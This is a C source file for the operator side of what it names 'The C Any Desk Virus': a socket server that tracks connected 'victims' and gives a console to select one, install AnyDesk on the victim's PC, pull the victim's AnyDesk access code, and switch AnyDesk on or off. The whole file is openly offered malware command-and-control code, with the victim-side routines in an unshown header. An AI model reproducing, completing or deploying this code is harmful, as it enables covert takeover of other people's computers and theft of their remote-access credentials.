#include <Windows.h>
#include <stdio.h>
#include <process.h>
#include <stdbool.h>
#include <WS2tcpip.h>
#include "hostCommands.h"

#define PORT 44444
#define IP "127.0.0.1"
#define MAX_CONNECTED_VICTIMS 25

// Functions
void startServer();
unsigned int __stdcall getCommands();
void processCommand(char *command);
// Global varaibles
int selectedVictimSocket = -1, connectedVictimsAmount = 0, victimsSockets[MAX_CONNECTED_VICTIMS];

void startServer()
{
    /*
    The func starts the server
    */

    struct sockaddr_in hostAddress, victimAddress;
    int serverSocDesc, victimSocDesc, iResult, victimAddressLen = sizeof(struct sockaddr_in);
    ;
    WSADATA wsaData;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed: %d\n", iResult);
        exit(1);
    }

    printf("Starting server...\n");

    // Creates the socket
    if ((serverSocDesc = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        printf("COULD NOT CREATE A SOCKET!\n");
        exit(1);
    }

    // Defines the host address
    hostAddress.sin_family = AF_INET;
    hostAddress.sin_addr.S_un.S_addr = inet_addr(IP);
    hostAddress.sin_port = htons(PORT);

    // Binds the socket
    if (bind(serverSocDesc, (struct sockaddr *)&hostAddress, sizeof(hostAddress)) < 0)
    {
        printf("COULD NOT BIND THE SOCKET!\n");
        exit(1);
    }

    // Listening
    if (listen(serverSocDesc, 5) < 0)
    {
        printf("COULD NOT LISTEN TO THE SOCKET!\n");
        exit(1);
    }

    printf("Waiting for victims...\n");

    _beginthreadex(0, 0, &getCommands, 0, 0, 0); // Commands thread

    while (true)
    {
        victimSocDesc = accept(serverSocDesc, (struct sockaddr *)&victimAddress, (socklen_t *)&victimAddressLen);

        printf("%s:%d has been conncted!\n", inet_ntoa(victimAddress.sin_addr), ntohs(victimAddress.sin_port));

        // Adds the victim socket descreption to the victims sockets array - [victimsSockets]
        victimsSockets[connectedVictimsAmount] = victimSocDesc;
        connectedVictimsAmount++;
    }
}

unsigned int __stdcall getCommands()
{
    /*
    Let's the user enter an commands at live
    */

    char command[8];

    while (true)
    {
        // Receives the commmand
        printf(">>");
        scanf("%s", &command);
        getchar(); // Clears buffer

        // Processes the command
        processCommand(command);
    }
}

void processCommand(char *command)
{
    /*
    Process [command]

    param 1: the command
    */

    // Checks the command

    if (strcmp(command, "help") == 0)
    {
        displayHelp();
    }
    else if (strcmp(command, "victims") == 0)
    {
        printf("There is %d connected victims\n", connectedVictimsAmount);
    }
    else if (strcmp(command, "select") == 0)
    {
        int vicitmIndex = 0;

        printf("Enter the victim socket index:");
        scanf("%d", &vicitmIndex);
        getchar(); // Clears buffer

        selectedVictimSocket = victimsSockets[vicitmIndex];
        printf("The victim has been selected!\n");
    }
    else if (strcmp(command, "install") == 0)
    {
        // If there is no selected victim
        if (selectedVictimSocket == -1)
        {
            printf("YOU HAVE TO SELECT VICTIM BEFORE YOU ACTIVE COMMANDS ON HIM!\n");
            return;
        }

        installAnyDesk(selectedVictimSocket); // Installs any desk on the victim's pc
    }
    else if (strcmp(command, "code") == 0)
    {
        // If there is no selected victim
        if (selectedVictimSocket == -1)
        {
            printf("YOU HAVE TO SELECT VICTIM BEFORE YOU ACTIVE COMMANDS ON HIM!\n");
            return;
        }

        char *code = getCode(selectedVictimSocket);
        printf("Victim anydesk code: %s", code);
        free(code);
    }
    else if (strcmp(command, "po") == 0)
    {
        // If there is no selected victim
        if (selectedVictimSocket == -1)
        {
            printf("YOU HAVE TO SELECT VICTIM BEFORE YOU ACTIVE COMMANDS ON HIM!\n");
            return;
        }

        powerOnAnyDesk(selectedVictimSocket);
    }
    else if (strcmp(command, "pof") == 0)
    {
        // If there is no selected victim
        if (selectedVictimSocket == -1)
        {
            printf("YOU HAVE TO SELECT VICTIM BEFORE YOU ACTIVE COMMANDS ON HIM!\n");
            return;
        }

        powerOffAnyDesk(selectedVictimSocket);
    }
    else
    {
        printf("UNKOWN COMMAND! TYPE help FOR MODE INFO...\n");
    }
}

int main(int argc, char const *argv[])
{
    printf("%s%s%s\n", "-----------------------------------",
           "Welcome To The C Any Desk Virus!",
           "-----------------------------------");

    // I want to get command only after the server will be up
    // _beginthreadex(0, 0, &startServer, 0, 0, 0); // Server thread
    // getCommands();

    startServer();

    return 0;
}
